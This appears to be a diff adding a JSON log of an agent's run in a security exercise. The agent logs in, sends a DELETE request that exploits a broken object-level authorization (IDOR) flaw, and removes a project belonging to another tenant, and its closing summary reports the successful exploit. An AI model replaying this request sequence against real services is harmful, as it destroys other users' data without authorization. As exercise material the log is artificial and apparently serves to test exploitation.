@@ -1,0 +1,52 @@
+[
+  {
+    "event_id": "evt_174cbf32be0545ae892450eb5af055ec",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": {
+        "email": "user_88837195@exercise.invalid",
+        "password": "pw_452bc157fb3f808e"
+      },
+      "method": "POST",
+      "path": "/auth/login",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_9213a2d274b54edb9c042fc34aea0ddb",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "DELETE",
+      "path": "/v1/projects/d584d15e-9c65-4e22-86fa-262b1168f7fc",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_3de4a8f18f8e422583f1b4c9f0938700",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "GET",
+      "path": "/v1/projects",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "status": "success",
+    "summary": "Signed in with the provided account and exploited the broken object-level authorization (IDOR) on DELETE /v1/projects/{id} to delete project d584d15e-9c65-4e22-86fa-262b1168f7fc, which belongs to a different tenant. The server returned 200 OK without ownership verification. Verified my own projects were unaffected.",
+    "type": "finish"
+  }
+]
